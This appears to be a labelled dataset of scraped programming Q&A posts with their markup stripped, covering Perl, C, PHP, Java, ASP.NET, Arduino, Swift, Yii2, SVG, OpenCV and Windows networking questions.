Negative 4587 pI am a junior currently taking a scripting languages class that is suppose to spit us out with intermediate level bash, perl, and python in one semester. Since this class is accelerated, we speed through topics quickly and our professor endorses using forums to supplement our learning if we have questions.p  pI am currently working on our first assignment. The requirement is to create a very simple dictionary attack using a provided wordlist linux.words and a basic bruteforce attack. The bruteforce needs to compensate for any combination of 4 letter strings.p  pI have used print statements to check if my logic is sound, and it seems it is. If you have any suggestions on how to improve my logic, I am here to learn and I am all ears.p  pThis is on Ubuntu v12.04 in case that is relevant.p  pI have tried replacing the scalar within the call with a straight word like unicorn and it runs fine, obviously is the wrong password, and it returns correctly. I have done this both in terminal and in the script itself. My professor has looked over this for a good 15 minutes he could spare, before referring me to forum, and said it looked good. He suspected that since I wrote the code using Notepad there might be hidden characters. I rewrote the code straight in the terminal using vim and it gave the same errors above. The code pasted is below is from vim.p  pMy actual issue is that my system call is giving me problems.

Negative 4587 pI recently started to use StyleCop for my C code static analysis.

Negative 4587 pI should mention that Im generating code in C, as opposed to doing this manually. I say this because it doesnt matter too much if theres a lot of code behind it, because the compiler should manage it all. Anyway, how would I go around emulating a lambda in C I was thinking I could just generate a function with some random name somewhere in the source code and then call that Im not too sure. I havent really tried anything just yet, since I wanted to get the idea down before I implement it.p  pIs there some kind of preprocessor directive I can do, or some macro that will make this cleaner to do Ive been inspired by Jon Blow to try out compiler development, and he seemed to implement Lambdas in his language Jai. However, I think he does something where he generates bytecode, and then into C Im not sure.p  pEdit Im working on a compiler, the compiler is just a project of mine to keep me busy, plus I wanted to learn more about compilers. I primarily use clang, Im on Ubuntu 14.10. I dont have any garbage collection, but I wanted to try my hand at some kind of smart pointeryrustARC inspired memory model for garbage collection, i.e. little to no overhead. I chose C because I wanted to dabble in it more. My project is free software, just a hobby project.p

Negative 4587 pI have been up and down through the SDK code and have the ability to add customer profiles and payment profiles for them but I cant see anywhere, where I can charge a card or create a subscription from a customer profile and customer payment profile.  Does anyone have an answer for this for either the create subscription, or charge a card, using the PHP SDK.  Please understand, giving me an interactive web example using AuthorizeNets web API is not helpful here.  The requirements are that it has to be done through the PHP SDK as we cannot have card user interaction past the point of the customer profile and customer payment profile creation.p

Negative 4587 pIn OO I think it is not uncommon for an object to register itself with another object perhaps a singleton for callbacks.p  pIn C I think it is not uncommon to do this registration in the constructor or super class constructor of the object being registered and to do the deregistration its the destructor.  This gives some assurances for the right timing.p  pI have two questions.  What is the best strategy to achieve this in Java in general, given the lack of a destructor  In android, if the object is just a member of an activity or a fragment, I guess the object should be registered and deregistered from within two of the on... methods in the activity or the fragment.  I think it may be hard to know exactly when the object will be destroyed.  Which 2 on... methods in an activity or in a fragment would be best to use for thisp  pAdditionally, perhaps less common, if the object is referenced from a number of other objects can one decide to deregister on the basis it is going out of scope and how or can one only deregister it based on some other state that just implies you are on balance probably happy to no longer receive call backsp

Negative 4587 pI have built an MVC application using ASP.NET Identity 2.0. I have done so before many times and I have no problem registering users, setting passwords, etc. It is all done for me by the template.p  pHowever, my client has asked to be able to manage users themselves. I assumed this would be as easy as creating a controller and views for the AspNetUsers table in the database. Its not though. For starters I have to create a model before I can create a controller and view, but given that it is codefirst that makes no sense really. I tried creating a viewmodel so as the database wouldnt want to be updated, but then EF doesnt recognise the AspNetUsers as there is no model so it cant connect.p  pIf I sound confused it is because I am. Can anyone shed some light. All I want is a view showing all the users and allowing the admin to add or delete users of the application. I know there will be a few gotchas like setting passwords etc, but I can figure that out later.p  pI dont want to have to roll my own user table if I can avoid it.p

Negative 4587 pBare with me Im still beginning. So my understanding of a keypad 4x4 is that one row voltage is 5v at one instant and switching really fast and for the arduino to understand which key has been pressed it just reads the row. That said I would like to do a key pad with push button where each button is connected to 5v and GND, then I just read what is on one side of the button thanks to a pullup resistor. Thus Ive 16 inputs I can read from. My question is can I transform those 16 inputs to 4  I believe thats an encoder but when I went to the shop the owner didnt know what I was talking about. To be fair I wasnt really clear. I will go back to the shop today and will ask again if this thing is actually what I need.p

Negative 4587 pI have a scenario where some changes have been made at JVM level in my application,like JSESSIONID have been mapped to HttpOnly and Secure attribute. But this HttpOnly attribute of JSESSIONID is impacting the Spring Web flow which is been implemeneted in one of the pages.p  pI tried to create a filter class to disable HttpOnly and Secure flag for that page.Output was that the another JSESSIONID was created with removed HttpOnly and Secure flags.But JSESSIONID with HttpOnly and Secure flag still exists.Because of that, Page not found is displayedp  pPlease suggest some ideas on this.Thanks in advancep

Negative 4587 pIm attempting to create a followerfollowing system kind of similar to the way Instagram has it.p  pI have one viewcontroller with two tableviews inside of it. The second tableview is within a viewcontroller that is inside of a containerview within the initial viewcontroller. p  pI dont have enough reputation so I cant post a link just yet, but heres a screenshot of my storyboard a hrefhttpi.imgur.comsNpHvdt.png relnofollowhttpi.imgur.comsNpHvdt.pngap  pSo basically the way it looks Two tableviews on one viewcontroller. I have the data being displayed correctly and I have a button within the subclassed tableviewcell that says Follow. On a .TouchUpInside, I want the cell to jump from the bottom tableview the one in the container view to the top tableview the one in the viewcontroller. p  pIm doing this in swift which Im still a bit new to, and Im using an NSMutableArray for users I am following and another NSMutableArray for users I am not following to display the indexPaths for each tableviewcell in each tableview.p  pIm thinking that I need a custom delegate to pass from the containerViewController to the parent View Controller, but the problem that I am having is that both tableviews are on the screen at the same time at all times. Ive been attempting to use reloadData and even beginUpdates and endUpdates but Im a bit confused as to what is going on. Im wondering if I should be creating a custom delegate from the subclasses uitableviewcell to the tableview within the containerView along with another delegate to pass from containerViewController to parent View Controller Can I go straight from subclassed tableviewcell within containerView to parent ViewController Or just VC to VCp  pHow do I get the data to pass it into the parent tableview in real timep  pIm kind of rubber ducking. Apologies if this is confusing. Im confused.p

Negative 4587 pIm wondering what is generally the recommended way to handle codeguestscode in codeYii2code.p  pLike, for example when you have a logged in user you can simply get their details via a call such asp  precodeuser  Yiiappgtusergtidentity codepre  pThen you can do stuff like the below, depending on what details you made available for themp  precodeusergtusername usergtemail codepre  pHowever, obviously when we have a codeguestcode codeYiiappgtusergtidentitycode returns codenullcode.p  pIn my situation I constantly need to check if the user is a guest or a logged in user and hence have to repeat code like this in various placesp  precodeif YiiappgtusergtisGuest      username  Yiitgeneral, Guest  else      username  Yiiappgtusergtidentitygtusername  codepre  p...doing this all over the place is obviously not very maintainable, so I am wanting to come up with a solution where I can just reference the username without having to do the check  but obviously I will still do guest checks where needed for security purposes, but Im trying to write maintainable code and as such want to come up with a solution for purposes where I just need information such as their username.p  pI am not sure if there is currently any recommended way to do this in codeYii2code, but I thought perhaps something like extending the codeyiiwebUsercode class and doing something like the belowp  precodepublic function getIdentity       identity  parentgetIdentity      if emptyidentity          identity  new stdClass         identitygtusername  Yiitgeneral, Guest           return identity   codepre  pIs that an advisable way to achieve what I want or is there a better wayp

Negative 4587 pIm trying to create a material design like shadow on an SVG circle. I want this shadow to grow with a nice transition when you click on the circle, but at the moment Im struggling to even figure out if its possible to animate this transition, so Im hoping someone might be able to help.p  pIve added a small example of what Ive got so far, a circle with a dropshadow which changes on mouseover. I spent quite a while trying to do the dropshadow in CSS but came to the conclusion that I dont think its possible right now.p  pNow that Ive got the shadows though, I cant find a way to animate them. Ive found some example using animation tags for single properties e.g. colour of the circle and found examples using keyframes for CSS transitions, but here I want to modify the actual filter itself. Is this possible and can someone illustrate how you might achieve this  ideally Im trying to achieve IE10FFChrome compatibility so Id be interested to know if there are any complications with the solutionp  pdiv classsnippet datalangjs datahidefalse div classsnippetcode pre classsnippetcodecss langcss prettyprintoverridecodecircle      fill 8BC34A     stroke white     strokewidth 2px     filter urlf1     transition 2s ease   circlehover      filter urlf2     transition 2s ease codepre pre classsnippetcodehtml langhtml prettyprintoverridecodeltsvg xmlnshttpwww.w3.org2000svg version1.1 width500 height500 viewPort0 0 200 200gt   ltdefsgt     ltfilter idf1 x40 y40 height200 width200gt       ltfeOffset resultoffOut inSourceAlpha dx0 dy0 gt       ltfeGaussianBlur resultblurOut inoffOut stdDeviation10 gt       ltfeBlend inSourceGraphic in2blurOut modenormal gt     ltfiltergt     ltfilter idf2 x40 y40 height200 width200gt       ltfeOffset resultoffOut inSourceAlpha dx0 dy0 gt       ltfeGaussianBlur resultblurOut inoffOut stdDeviation30 gt       ltfeBlend inSourceGraphic in2blurOut modenormal gt     ltfiltergt   ltdefsgt   ltcircle r100 cx150 cy150 gt ltsvggtcodepre div div p  pstrongUPDATEstrongp  pAfter trying a few things, Ive put some examples together, although none of them quite do what I want.

Negative 4587 pWhat is the reasoning behind the steps of the algorithms mentioned in the paper An Image Signature for any kind of image by H.Chi Wong, Marshall Bern, David Goldberg  This is the link to the research paper a hrefhttpciteseerx.ist.psu.eduviewdocdownloaddoi10.1.1.104.2585ampreprep1amptypepdf relnofollowhttpciteseerx.ist.psu.eduviewdocdownloaddoi10.1.1.104.2585ampreprep1amptypepdfap  pThe second step of the paper states that For each column of the image we computer the sum of absolute values of differences between adjacent pixels in that column. We compute the total of all columns and crop the image at the 5  and 95 columns, that is the columns such that 5  of the total sum of differences lies on either side of the cropped image.  What do you mean by cropping the image at the 5  and 95 columns and lies on either side of the cropped image  The first step is to convert the image to grayscale. p  pThe second step states that a 9x9 grid of points must be imposed on the image, How is it possible to do so using OpenCV 2.4.11 in Microsoft Visual Studio 2012p  pThanks in advance for your time and effort.p  pP.S I am a student working for a nonprofit cause in a research institute. Your answers to these questions will be very important and useful to implement a project to find similar images.p

Negative 4587 pIm tidying my code and I have the same method in a number of different view controllers which builds the page header.

Negative 4587 pI know how to adjust the adapter binding order in Windows so that LAN is preferred over wireless, and remote access connections are preferred over either.  The latter is very important when accessing resources over the VPN that have different addresses on the inside of the remote network than they do on the Internet.p  pa hrefhttpi.stack.imgur.comF9KgP.png relnofollowimg srchttpi.stack.imgur.comF9KgP.png altWindows 10 adapter binding order dialogap  pUnfortunately, when I change the order so the remote access connections are listed first and click OK, the change does not take effect, and is back in the other order when I check it again.  This works properly on Windows 7 and 8.p  pIve been looking for similar reports and a solution, but havent found anything.  I suspect that this is a bug in Windows 10.p
